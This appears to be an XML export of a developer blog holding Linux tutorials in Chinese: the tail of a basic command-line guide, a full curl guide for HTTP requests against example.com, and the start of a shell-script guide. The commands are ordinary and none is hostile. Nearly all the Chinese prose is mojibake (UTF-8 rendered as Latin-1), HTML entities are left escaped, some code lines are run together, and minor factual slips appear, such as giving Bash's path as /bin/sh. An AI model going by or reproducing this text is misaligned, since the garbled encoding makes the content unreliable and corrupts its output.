killallï¼šç›´æ¥ä½¿ç”¨ç¨‹å¼çš„åç¨±ä¾†æŒ‡å®šè¦çµ‚æ­¢çš„ç¨‹å¼
 $ killall hello.py

å¥—ä»¶ç®¡ç†
apt-getï¼šå¥—ä»¶ç®¡ç†å·¥å…·
 æ›´æ–°å¥—ä»¶è³‡æ–™åº«åˆ—è¡¨ï¼š
 $ sudo apt-get update

 å‡ç´šå¥—ä»¶ä¸¦ä¸‹è¼‰å®‰è£å¥—ä»¶ï¼š
 $ sudo apt-get upgrade

 æœå°‹ç›¸é—œè»Ÿé«”å¥—ä»¶ï¼ˆä½¿ç”¨åç¨±ï¼‰ï¼š
 $ apt-cache search --names-only fortune

 å®‰è£å¥—ä»¶ï¼š
 $ sudo apt-get install fortune

 ç§»é™¤å¥—ä»¶ï¼š
 $ sudo apt-get remove fortune

ç¶²éš›ç¶²è·¯ç›¸é—œæ“ä½œ
pingï¼šç¶²è·¯æª¢æ¸¬å·¥å…·ï¼Œé€éç™¼é€ ICMP ECHO_REQUEST çš„å°åŒ…ï¼Œæª¢æŸ¥è‡ªå·±èˆ‡ç‰¹å®šè¨­å‚™ä¹‹é–“çš„ç¶²è·¯æ˜¯å¦æš¢é€šï¼Œé€Ÿåº¦æ˜¯å¦æ­£å¸¸
 å¯è¼¸å…¥ hostname æˆ–æ˜¯ IPï¼š
 $ ping google.com


 PING google.com (172.217.160.110): 56 data bytes 64 bytes from 172.217.160.110: icmp_seq&#x3D;0 ttl&#x3D;57 time&#x3D;7.037 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;1 ttl&#x3D;57 time&#x3D;9.411 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;2 ttl&#x3D;57 time&#x3D;22.690 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;3 ttl&#x3D;57 time&#x3D;6.561 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;4 ttl&#x3D;57 time&#x3D;6.909 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;5 ttl&#x3D;57 time&#x3D;6.311 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;6 ttl&#x3D;57 time&#x3D;6.860 ms 64 bytes from 172.217.160.110: icmp_seq&#x3D;7 ttl&#x3D;57 time&#x3D;6.583 ms

traceroutesï¼šæª¢æŸ¥å¾ä½ çš„é›»è…¦åˆ°ç¶²è·¯å¦ä¸€ç«¯çš„ä¸»æ©Ÿæ˜¯èµ°çš„ä»€éº¼è·¯å¾‘
 $ traceroute google.com

 traceroute to google.com (172.217.27.142), 64 hops max, 52 byte packets 1  zyxel.home (192.168.1.1)  2.047 ms  1.208 ms  1.888 ms 2  h254.s98.ts.hinet.net (168.95.98.254)  6.189 ms  8.556 ms  5.875 ms 3  168-95-85-2.hinet-ip.hinet.net (168.95.85.2)  7.057 ms  5.796 ms  5.998 ms 4  211-22-226-1.hinet-ip.hinet.net (211.22.226.1)  9.766 ms  10.422 ms 72.14.222.94 (72.14.222.94)  9.744 ms 5  108.170.244.97 (108.170.244.97)  8.386 ms 108.170.244.129 (108.170.244.129)  11.500 ms  12.247 ms 6  209.85.142.13 (209.85.142.13)  7.015 ms  7.505 ms 209.85.240.15 (209.85.240.15)  6.750 ms 7  tsa03s02-in-f142.1e100.net (172.217.27.142)  11.478 ms  6.608 ms  6.893 ms

nslookupï¼šæŸ¥è©¢ DNS å›æ‡‰æ˜¯å¦æ­£å¸¸
 $ nslookup google.com

 Server:		192.168.1.1 Address:	192.168.1.1#53
 Non-authoritative answer: Name:	google.com Address: 216.58.200.238


å…¶ä»–å¥½ç”¨æŒ‡ä»¤
manï¼šæŸ¥è©¢ Linux ç·šä¸Šæ‰‹å†Šï¼ˆman pageï¼‰
 $ man

 ä¾‹å¦‚æˆ‘å€‘å¯ä»¥ä½¿ç”¨ man ä¾†æŸ¥è©¢ ls çš„ä½¿ç”¨ç”¨æ³•ï¼š
 $ man ls

findï¼šæŸ¥è©¢æª”æ¡ˆ
 åœ¨ç›®å‰ç›®éŒ„ä¸‹å°‹æ‰¾æª”åç‚º README.md æª”æ¡ˆ
 $ find . -name README.md

grepï¼šå¼·å¤§æ–‡ä»¶å­—ä¸²æœå°‹å·¥å…·
 $ grep &#x27;æ‰¾é€™å€‹å­—ä¸²&#x27; file_name

 æ‰¾æ‰€æœ‰ç›®éŒ„ï¼ˆå«å­ç›®éŒ„ï¼‰ä¸‹æª”æ¡ˆ
 $ grep -r &#x27;å­—ä¸²&#x27; *

crontabï¼šä¾‹è¡Œæ€§å·¥ä½œæ’ç¨‹
 ç·¨è¼¯ crontab
 $ crontab -e

 crontab æ ¼å¼ï¼š
 åˆ† æ™‚ æ—¥ æœˆ æ˜ŸæœŸ è¦åŸ·è¡Œçš„æŒ‡ä»¤30 12   *   *   *  python /projects/hello.py &amp;åœ¨ 12:30 æ™‚åŸ·è¡Œ hello.pyï¼Œ&amp; è¡¨ç¤ºèƒŒæ™¯åŸ·è¡Œ* è™Ÿè¡¨ç¤ºæ¯æ—¥æ¯æœˆæ¯æ˜ŸæœŸéƒ½åŸ·è¡Œ

æ’°å¯«ç¬¬ä¸€å€‹ shell scriptShell æ˜¯æˆ‘å€‘å’Œ Linux ç³»çµ±çš„ä»‹é¢ï¼Œæˆ‘å€‘å¯ä»¥é€éçµ‚ç«¯æ©Ÿåœ¨ä¸Šé¢è¼¸å…¥æŒ‡ä»¤å’Œä½œæ¥­ç³»çµ±äº’å‹•ï¼Œè®“ä»–åšæˆ‘å€‘æƒ³åšçš„äº‹æƒ…ã€‚åœ¨ Linux ä¸­æ¨™æº–çš„ Shell ç‚ºï¼ˆBourne Again Shellï¼‰ï¼Œæª”æ¡ˆè·¯å¾‘ç‚º /bin/shï¼Œæˆ‘å€‘å¯ä»¥é€é $ echo $SHELL å»å°å‡ºç›®å‰ä½¿ç”¨çš„ shell
å…¶ä¸­ Shell Script ç‚ºä½¿ç”¨ shell æ‰€æä¾›çš„èªæ³•æ‰€æ’°å¯«çš„ç¨‹å¼ç¢¼ï¼Œå…¶ç‚ºç›´è­¯å¼ä¸ç”¨ç·¨è­¯ã€‚å¯ä»¥è®“ä½ å°‡è¤‡é›œæˆ–æ˜¯é‡è¤‡æ€§çš„æŒ‡ä»¤å¯«æˆç¨‹å¼ç¢¼æª”æ¡ˆ
$ vim example.sh

åœ¨ç·¨è¼¯æ¨¡å¼è¼¸å…¥ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼Œï¼š
#!/bin/bash# é€™æ˜¯è¨»è§£ï¼Œä¸Šé¢æ‰€ä½¿ç”¨çš„ shellecho &quot;æ—¥æœŸ&quot;dateecho &quot;å°å‡ºæª”æ¡ˆåˆ—è¡¨&quot;ls -l

ä¿®æ”¹æ¬Šé™æˆå¯ä»¥åŸ·è¡Œï¼š
$ chmod u+x example.sh

æ¥è‘—åŸ·è¡Œï¼Œè‹¥æ˜¯ä¸€åˆ‡é †åˆ©å°±å¯ä»¥åœ¨çµ‚ç«¯æ©Ÿçœ‹åˆ°æ™‚é–“æ—¥æœŸå’Œæª”æ¡ˆåˆ—è¡¨ï¼æ­å–œä½ å®Œæˆä½ çš„ç¬¬ä¸€å€‹ shell scriptï¼
$ ./example.sh

ç¸½çµä»¥ä¸Šä»‹ç´¹äº† Linux&#x2F;Ubuntu å¸¸ç”¨æŒ‡ä»¤å’ŒåŸºç¤æ“ä½œçš„å…¥é–€æ•™å­¸ä»‹ç´¹ä¸Šï¼Œå¯¦éš›ä¸Šè®€è€…ä¸ç”¨åˆ»æ„å»èƒŒèª¦ï¼Œè€Œæ˜¯åœ¨å¯¦éš›ä¸Šæ“ä½œä¸­ç·´ç¿’ï¼Œå¤šç´¯ç©æ’°å¯«ç¨‹å¼ä¸¦ä½¿ç”¨æŒ‡ä»¤ç¢¼å»åŠ å¿«ç¨‹å¼é–‹ç™¼çš„é€Ÿåº¦è‡ªç„¶è€Œç„¶å°±æœƒæŠŠæŒ‡ä»¤ç¢¼è¨˜æ†¶èµ·ä¾†äº†ï¼Œè‹¥æ˜¯çœŸçš„å¿˜è¨˜å†å»ç¶²è·¯ä¸ŠæŸ¥æ‰¾å°±å¥½ï¼ŒåŠ æ²¹ï¼
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
åƒè€ƒæ–‡ä»¶
åˆçª¥Linux ä¹‹ æˆ‘æœ€å¸¸ç”¨çš„20æ¡å‘½ä»¤
ã€ï¼¬ã€‘Linux å¸¸ç”¨æŒ‡ä»¤é›†
Linux çš„ su èˆ‡ sudo æŒ‡ä»¤æ•™å­¸èˆ‡ç¯„ä¾‹
digã€host èˆ‡ nslookup æŒ‡ä»¤çš„æŸ¥è©¢èªæ³•
nslookup â€” æŸ¥è©¢ DNS æŒ‡ä»¤
åœ¨ Linux ä¸‹ä½¿ç”¨ find æŒ‡ä»¤æŸ¥è©¢ç›®éŒ„èˆ‡æª”æ¡ˆçš„é€ŸæŸ¥ç­†è¨˜
grep æœå°‹ç›®éŒ„ä¸‹æ‰€æœ‰æª”æ¡ˆå­—ä¸²
ç¬¬åäº”ç« ã€ä¾‹è¡Œæ€§å·¥ä½œæ’ç¨‹(crontab)

ï¼ˆimage via unixmenã€cloudxlabã€ytimgã€ytimgã€linuxã€imgurï¼‰
]]></content>
      <tags>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«</tag>
        <tag>è»Ÿé«”å·¥ç¨‹</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>æŒ‡ä»¤</tag>
        <tag>å‘½ä»¤åˆ—</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Curl Command æŒ‡ä»¤èˆ‡åŸºæœ¬æ“ä½œå…¥é–€æ•™å­¸</title>
    <url>/2019/02/01/linux-curl-command-tutorial/</url>
    <content><![CDATA[
å‰è¨€èº«ç‚ºä¸€å€‹ Web é–‹ç™¼è€…ï¼Œå¾€å¾€éœ€è¦é–‹ç™¼ä¸åŒçš„ Restful API ï¼ˆApplication Programming Interfaceï¼‰ä¾†å­˜å–è³‡æºã€‚åœ¨é–‹ç™¼å®Œ API å¾Œæ¸¬è©¦å‰‡æœƒä½¿ç”¨é¡ä¼¼ Postman çš„æ¸¬è©¦å·¥å…·ä¾†é€²è¡Œæ¸¬è©¦ã€‚é™¤äº†ä½¿ç”¨ Postman ç­‰ GUI Tool å¤–ï¼Œèº«ç‚ºä¸€å€‹è»Ÿé«”å·¥ç¨‹å¸«ï¼Œç•¶ç„¶è¦å­¸æœƒä½¿ç”¨ Linux æŒ‡ä»¤ä¸­çš„ Curlï¼é€™é‚Šæˆ‘å€‘æ•´ç†äº† Curl å¸¸ç”¨çš„æŒ‡ä»¤ï¼Œè®“å¤§å®¶å¯ä»¥é‡æ–°æº«ç¿’ï¼Œè®€è€…ä¹Ÿå¯ä»¥åˆ†äº«è‡ªå·±çš„å¸¸ç”¨çš„æŒ‡ä»¤ä¾†æå‡å·¥ä½œæ•ˆç‡ã€‚å¥½ï¼Œé‚£æˆ‘å€‘å°±é–‹å§‹å§ï¼
Curl æŒ‡ä»¤åŸºæœ¬ä»‹ç´¹èˆ‡å¸¸è¦‹ç”¨æ³•Curl æ˜¯ä¸€å€‹åœ¨ Linux ä¸Šç”¨ä¾†é€é HTTP Protocolï¼ˆHTTP HyperText Transfer Protocol å®šç¾©å­˜å–ç¶²è·¯è³‡æºçš„å”å®šï¼Œè®“æˆ‘å€‘å¯ä»¥ä½¿ç”¨ client &#x2F; server æ¨¡å¼ä¾†å–å¾—ç¶²è·¯è³‡æºï¼‰ä¸‹è¼‰å’Œä¸Šå‚³æª”æ¡ˆçš„æŒ‡ä»¤ï¼ˆæ¯”èµ· wget åªèƒ½ä¸‹è¼‰å¼·å¤§è¨±å¤šï¼‰ã€‚å®ƒåŸºæœ¬çš„æŒ‡ä»¤æ ¼å¼å¦‚ä¸‹ï¼š
curl [options] [URL...]

æ–°æ‰‹ä¸Šè·¯ï¼Œæˆ‘å€‘ä¾†çœ‹çœ‹æœ€åŸºæœ¬çš„ç”¨æ³•ï¼š
æ‰“é–‹çµ‚ç«¯æ©Ÿï¼ˆterminalï¼‰ç„¶å¾Œï¼Œcurl å¾Œé¢åŠ ç¶²å€ï¼Œå°±æœƒåœ¨çµ‚ç«¯æ©Ÿå…§é¡¯ç¤ºå›å‚³çš„ responseï¼Œå¯èƒ½æ˜¯ HTMLã€JSON æˆ–æ˜¯ XML ç­‰æ ¼å¼ï¼Œæ ¹æ“šè¼¸å…¥çš„ URL å…§å®¹è€Œå®šã€‚ 
curl https://www.google.com

ä¾‹å¦‚æˆ‘æƒ³è¦ä¸‹è¼‰ï¼šé»ƒè‰²å°é´¨çš„åœ–ç‰‡ï¼Œå¯ä»¥ä½¿ç”¨ -o æ­é…æ¬²ä¸‹è¼‰çš„æª”åå’Œç¶²å€
curl -o duck.jpg https://im2.book.com.tw/image/getImage?i=https://www.books.com.tw/img/N00/040/56/N000405619.jpg&amp;v=522ff1cf&amp;w=348&amp;h=348

è‹¥æ˜¯ä½¿ç”¨ -O å‰‡å¯ä»¥ç›´æ¥ä½¿ç”¨ä¸‹è¼‰ç¶²å€çš„æª”æ¡ˆæª”åä¾†å‘½åä¸‹è¼‰çš„æª”æ¡ˆï¼ˆN000405619.jpgï¼‰ï¼š
curl -O https://im2.book.com.tw/image/getImage?i=https://www.books.com.tw/img/N00/040/56/N000405619.jpg&amp;v=522ff1cf&amp;w=348&amp;h=348

æœ‰å¯èƒ½åœ¨ä¸‹è¼‰éç¨‹ä¸­è¢«ä¸­æ–·ï¼Œè‹¥æ˜¯æƒ³è¦å¾ä¸­æ–·çš„åœ°æ–¹ç¹¼çºŒçš„è©±ï¼Œå¯ä»¥ä½¿ç”¨ -C é¸é …ï¼š
curl -C - -O http://releases.ubuntu.com/18.04/ubuntu-18.04-desktop-amd64.iso

è‹¥å¸Œæœ›å¯ä»¥è·Ÿéš¨è‘—ç¶²å€ 301&#x2F;302 redirect çš„è©±ï¼Œå¯ä»¥ä½¿ç”¨ -L é¸é …ï¼š
curl -L http://google.com

å¯ä»¥æ¯”è¼ƒæ²’æœ‰ä½¿ç”¨ -L çš„å›æ‡‰ï¼š
$ curl http://google.com&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;&lt;TITLE&gt;301 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;301 Moved&lt;/H1&gt;The document has moved&lt;A HREF=&quot;http://www.google.com/&quot;&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;

è‹¥æˆ‘å€‘è¦è¿½è¹¤æ•´å€‹ curl éç¨‹ä¸¦å°‡çµæœå­˜å…¥ debugdump.txt æª”æ¡ˆå¯ä»¥ä½¿ç”¨ --trace-ascii æŒ‡ä»¤ï¼š
curl --trace-ascii debugdump.txt http://www.example.com/
$ cat debugdump.txt== Info:   Trying 93.184.216.34...== Info: TCP_NODELAY set== Info: Connected to www.example.com (93.184.216.34) port 80 (#0)=&gt; Send header, 142 bytes (0x8e)0000: GET / HTTP/1.10010: Host: www.example.com0027: User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; T0067: rident/5.0)0074: Accept: */*0081: Referer:008c:&lt;= Recv header, 17 bytes (0x11)0000: HTTP/1.1 200 OK&lt;= Recv header, 31 bytes (0x1f)0000: Cache-Control: max-age=604800&lt;= Recv header, 40 bytes (0x28)0000: Content-Type: text/html; charset=UTF-8&lt;= Recv header, 37 bytes (0x25)0000: Date: Sat, 02 Feb 2019 13:54:23 GMT&lt;= Recv header, 31 bytes (0x1f)0000: Etag: &quot;1541025663+gzip+ident&quot;&lt;= Recv header, 40 bytes (0x28)0000: Expires: Sat, 09 Feb 2019 13:54:23 GMT&lt;= Recv header, 46 bytes (0x2e)0000: Last-Modified: Fri, 09 Aug 2013 23:54:35 GMT&lt;= Recv header, 24 bytes (0x18)0000: Server: ECS (sjc/4E44)&lt;= Recv header, 23 bytes (0x17)0000: Vary: Accept-Encoding&lt;= Recv header, 14 bytes (0xe)0000: X-Cache: HIT&lt;= Recv header, 22 bytes (0x16)0000: Content-Length: 1270&lt;= Recv header, 2 bytes (0x2)0000:&lt;= Recv data, 1270 bytes (0x4f6)0000: &lt;!doctype html&gt;.&lt;html&gt;.&lt;head&gt;.    &lt;title&gt;Example Domain&lt;/title&gt;.0040: .    &lt;meta charset=&quot;utf-8&quot; /&gt;.    &lt;meta http-equiv=&quot;Content-type0080: &quot; content=&quot;text/html; charset=utf-8&quot; /&gt;.    &lt;meta name=&quot;viewport00c0: &quot; content=&quot;width=device-width, initial-scale=1&quot; /&gt;.    &lt;style ty0100: pe=&quot;text/css&quot;&gt;.    body &#123;.        background-color: #f0f0f2;.0140:      margin: 0;.        padding: 0;.        font-family: &quot;Open S0180: ans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;.        .01c0:    &#125;.    div &#123;.        width: 600px;.        margin: 5em auto;.0200:        padding: 50px;.        background-color: #fff;.        bo0240: rder-radius: 1em;.    &#125;.    a:link, a:visited &#123;.        color: #0280: 38488f;.        text-decoration: none;.    &#125;.    @media (max-wid02c0: th: 700px) &#123;.        body &#123;.            background-color: #fff;.0300:         &#125;.        div &#123;.            width: auto;.            mar0340: gin: 0 auto;.            border-radius: 0;.            padding:0380: 1em;.        &#125;.    &#125;.    &lt;/style&gt;    .&lt;/head&gt;..&lt;body&gt;.&lt;div&gt;.03c0: &lt;h1&gt;Example Domain&lt;/h1&gt;.    &lt;p&gt;This domain is established to be0400: used for illustrative examples in documents. You may use this.0440:   domain in examples without prior coordination or asking for pe0480: rmission.&lt;/p&gt;.    &lt;p&gt;&lt;a href=&quot;http://www.iana.org/domains/exampl04c0: e&quot;&gt;More information...&lt;/a&gt;&lt;/p&gt;.&lt;/div&gt;.&lt;/body&gt;.&lt;/html&gt;.== Info: Curl_http_done: called premature == 0== Info: Connection #0 to host www.example.com left intact

ä½¿ç”¨ Curl ä¾†é€²è¡Œ HTTP Requesté™¤äº†ç°¡æ˜“çš„ä¸‹è¼‰æª”æ¡ˆæˆ–æ˜¯å–å¾—ç¶²é å…§å®¹å¤–ï¼ŒCurl é‚„æ”¯æ´å„ç¨®ä¸åŒ HTTP è«‹æ±‚æ–¹æ³•ï¼ˆHTTP methodï¼‰ï¼Œä»¥ä¸‹åˆ—å‡ºå¸¸ç”¨æŒ‡ä»¤å’Œé¸é …åƒæ•¸ï¼š
-X/--request [GET|POST|PUT|DELETE|PATCH]  ä½¿ç”¨æŒ‡å®šçš„ http method ä¾†ç™¼å‡º http request-H/--header                           è¨­å®š request è£¡æ‰€æ”œå¸¶çš„ header-i/--include                          åœ¨ output é¡¯ç¤º response çš„ header-d/--data                             æ”œå¸¶ HTTP POST Data -v/--verbose                          è¼¸å‡ºæ›´å¤šçš„è¨Šæ¯æ–¹ä¾¿ debug-u/--user                             æ”œå¸¶ä½¿ç”¨è€…å¸³è™Ÿã€å¯†ç¢¼-b/--cookie                           æ”œå¸¶ cookieï¼ˆå¯ä»¥æ˜¯åƒæ•¸æˆ–æ˜¯æª”æ¡ˆä½ç½®ï¼‰


GET

ç°¡æ˜“ä¸€å€‹ URL ç‰ˆæœ¬ï¼Œå¯ä»¥æ”œå¸¶ query string åƒæ•¸å–å¾—ç¶²è·¯è³‡æºï¼š
$ curl https://example.com?q1=123&amp;q2=abc

åœ¨åŒä¸€å€‹æŒ‡ä»¤ä½¿ç”¨å¤šå€‹ URLï¼š
$ curl http://example1.com http://example2.com


Form POST

ä¸€èˆ¬è€Œè¨€æˆ‘å€‘ Form è¡¨å–®çš„ HTML æœƒé•·é€™æ¨£ï¼š
&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;   &lt;input type=text name=&quot;email&quot;&gt;   &lt;input type=submit name=press value=&quot; OK &quot;&gt;&lt;/form&gt;

ç”±æ–¼ Form post æ˜¯ä½¿ç”¨ application/x-www-form-urlencoded Content-Typeï¼Œæ‰€ä»¥å‚³éçš„å€¼éœ€è¦ç·¨ç¢¼ï¼š
ï¼„ curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot;  http://www.example.com/form.php


File Upload POSTå¦ä¸€ç¨®å¸¸è¦‹ Form è¡¨å–®æ˜¯æœ‰æ¶‰åŠæª”æ¡ˆä¸Šå‚³ï¼ˆä½¿ç”¨ multipart&#x2F;form-data Content-Typeï¼‰ï¼š

&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt; &lt;input type=file name=upload&gt; &lt;input type=submit name=press value=&quot;OK&quot;&gt;&lt;/form&gt;

å¯ä»¥çœ‹åˆ°æŒ‡ä»¤æœƒéœ€è¦æ”œå¸¶ upload æª”æ¡ˆï¼š
$ curl -X POST -F &#x27;file=@./upload.txt&#x27; http://www.example.com/upload.php


å¸¸è¦‹ Restful CRUD æŒ‡ä»¤ï¼š

GET å–®ä¸€å’Œå…¨éƒ¨è³‡æº
 $ curl -X GET &quot;http://www.example.com/api/resources&quot;$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;

POST JSON è³‡æ–™ï¼š 
 $ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot; : false, &quot;name&quot; : &quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;

PUT JSON è³‡æ–™ï¼š 
 $ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot; : false &#125;&#x27; &quot;http://www.example.com/api/resources&quot;

DELETE è³‡æºï¼š
 $ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;


æ”œå¸¶ cookie


åœ¨æŒ‡ä»¤ä¸­è¼¸å…¥ cookieï¼š
$ curl --cookie &quot;name=Jack&quot; http://www.example.com

å¾æª”æ¡ˆè®€å– cookieï¼š
$ curl --cookie stored_cookies_file_path http://www.example.com


æ”œå¸¶ User Agent

$ curl --user-agent &quot;Mozilla/5.0 (compatible; MSIE 5.01; Windows NT 5.0)&quot; http://www.example.com


Basic Authentication

è‹¥æ‰€å­˜å–ç¶²é æœ‰ä½¿ç”¨ Basic Authenticationï¼Œå¯ä»¥æ”œå¸¶ --user username:password ä¾†é€šéé©—è­‰ï¼š
$ curl -i --user secret:vary_secret http://www.example.com/api/resources


ç¸½çµä»¥ä¸Šä»‹ç´¹äº† Linux Curl å¸¸ç”¨æŒ‡ä»¤å’ŒåŸºç¤æ“ä½œçš„å…¥é–€æ•™å­¸ä»‹ç´¹ï¼š

GET&#x2F;POST&#x2F;PUT&#x2F;DELETE æ“ä½œ
ä¸‹è¼‰æª”æ¡ˆ
Form è¡¨å–®æ“ä½œ
æª”æ¡ˆä¸Šå‚³
Restful CRUD æŒ‡ä»¤
User Agent
Basic Authentication

ä¹‹å¾Œè®€è€…é™¤äº†ä½¿ç”¨ Postman ç­‰ GUI Tool å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ Curl ä¾†é€²è¡Œ HTTP endpoint çš„æ¸¬è©¦å’Œé–‹ç™¼ä¸Šï¼è®€è€…ä¹Ÿå¯ä»¥åˆ†äº«è‡ªå·±çš„å¸¸ç”¨çš„æŒ‡ä»¤ä¾†æå‡å·¥ä½œæ•ˆç‡ï¼
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
åƒè€ƒæ–‡ä»¶
Upload files with CURL

ï¼ˆimage via linuxinsiderï¼‰
]]></content>
      <tags>
        <tag>è»Ÿé«”å·¥ç¨‹å¸«</tag>
        <tag>è»Ÿé«”å·¥ç¨‹</tag>
        <tag>software engineering</tag>
        <tag>bash</tag>
        <tag>shell</tag>
        <tag>linux</tag>
        <tag>æŒ‡ä»¤</tag>
        <tag>å‘½ä»¤åˆ—</tag>
        <tag>command line</tag>
        <tag>script</tag>
        <tag>unix</tag>
        <tag>mac</tag>
        <tag>os</tag>
        <tag>windows</tag>
        <tag>curl</tag>
      </tags>
  </entry>
  <entry>
    <title>ç°¡æ˜ Linux Shell Script å…¥é–€æ•™å­¸</title>
    <url>/2019/11/15/linux-shell-script-tutorial/</url>
    <content><![CDATA[
å‰è¨€Shell æ˜¯ä¸€ç¨®è®“ä½¿ç”¨è€…å¯ä»¥å’Œä½œæ¥­ç³»çµ± Kernelï¼ˆæ ¸å¿ƒç”¨ä¾†æ§åˆ¶ CPUã€è¨˜æ†¶é«”ã€ç¡¬ç¢Ÿç­‰ç¡¬é«”ï¼‰äº’å‹•æºé€šçš„æ©‹æ¨‘ã€‚Shell Script ä¸»è¦æ˜¯ä½¿ç”¨åœ¨ Linux å’Œ MacOS ç­‰ Unix-like ä½œæ¥­ç³»çµ±çš„è‡ªå‹•åŒ–æ“ä½œæŒ‡ä»¤çš„ç¨‹å¼èªè¨€ã€‚å…¶é€é Unix shell å‘½ä»¤åˆ—ç›´è­¯å™¨ä¾†åŸ·è¡Œï¼ˆæˆ‘å€‘é€™é‚Šä¸»è¦ä½¿ç”¨ bash shellï¼Œå…¶ä»–çš„ Unix shell è§€å¿µå¤§è‡´é¡ä¼¼ï¼‰ï¼Œä½¿ç”¨æ–¹å¼æœ‰é»é¡ä¼¼ç›´è­¯å¼ç¨‹å¼èªè¨€ï¼ˆä¸ç”¨ç·¨è­¯ç›´æ¥åŸ·è¡Œï¼‰ã€‚åœ¨ Windows ç³»åˆ—å®¶æ—ä¹Ÿæœ‰é¡ä¼¼çš„ä½¿ç”¨æ–¹å¼ï¼šBatch fileã€‚

ä¸€èˆ¬æƒ…æ³ Shell Script å¸¸ç”¨æ–¼ç³»çµ±ç®¡ç†ã€è‡ªå‹•åŒ–æ“ä½œæª”æ¡ˆã€è‡ªå‹•åŒ–é‡è¤‡çš„æŒ‡ä»¤ç¢¼ã€åˆ†æ log ç­‰æ–‡ä»¶æª”æ¡ˆã€åˆ—å°å‘ˆç¾æˆ‘å€‘æƒ³è¦çš„è³‡æ–™ç­‰ï¼Œé€éç¨‹å¼èªè¨€çš„ä½¿ç”¨ä¾†æ¸›å°‘é‡è¤‡ç‘£ç¢çš„å·¥ä½œï¼Œæ‰€ä»¥è‹¥èƒ½å¦¥å–„ä½¿ç”¨å°‡æå‡ä¸å°‘é–‹ç™¼è€…å’Œè»Ÿé«”å·¥ç¨‹å¸«çš„æ—¥å¸¸å·¥ä½œæ•ˆç‡ã€‚æ¥è‘—æˆ‘å€‘å°‡é€éæ—¥å¸¸ç”Ÿæ´»å¸¸ç”¨çš„ä½¿ç”¨æƒ…å¢ƒï¼Œå¸¶é ˜è®€è€…å€‘é€²å…¥å…¥é–€ Shell Scriptï¼ˆè®€è€…éœ€è¦å…·å‚™åŸºæœ¬ Linux æŒ‡ä»¤ç¢¼çš„åŸºæœ¬è§€å¿µï¼Œè‹¥ä½ éœ€è¦è¤‡ç¿’å¸¸è¦‹ Linux æŒ‡ä»¤å¯ä»¥åƒè€ƒ Linux Command å‘½ä»¤åˆ—æŒ‡ä»¤èˆ‡åŸºæœ¬æ“ä½œå…¥é–€æ•™å­¸ï¼‰ã€‚
Shell Script åˆé«”é©—åœ¨æ’°å¯« Shell Script ä¹‹å‰æˆ‘å€‘å…ˆä¾†äº†è§£ Shell Script æ’°å¯«çš„æµç¨‹å’Œæ¶æ§‹ã€‚ä¸€èˆ¬æˆ‘å€‘æœƒä½¿ç”¨ .sh å‰¯æª”åä¾†å‘½å Shell Script æª”æ¡ˆã€‚ç„¶å¾Œå°‡è©²æª”æ¡ˆè¨­å®šç‚ºå¯åŸ·è¡Œï¼š
chmod +x demo.sh

å¯ä»¥é€éæª¢è¦–æª”æ¡ˆè©³ç´°è³‡æ–™è§€çœ‹æ˜¯å¦å·²æœ‰ +x çš„åŸ·è¡Œæ¬Šé™ï¼š
ls -l demo.sh# -rwxr-xr-x  1 user  staff  106 Nov 16 10:41 demo.sh

åŸ·è¡Œ Shell Script æª”æ¡ˆï¼š
./demo.sh

æ¥è‘—ï¼Œæˆ‘å€‘å…ˆåˆ©ç”¨ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼šå°‡ç›®å‰åŸ·è¡Œ process çš„ PID ä¾ç…§æ•¸å­—å¤§å°æ’åºï¼Œå–å‡ºå‰ 10 åï¼Œä¾†äº†è§£æ’°å¯« Shell Script çš„åŸºæœ¬æ¶æ§‹ã€‚
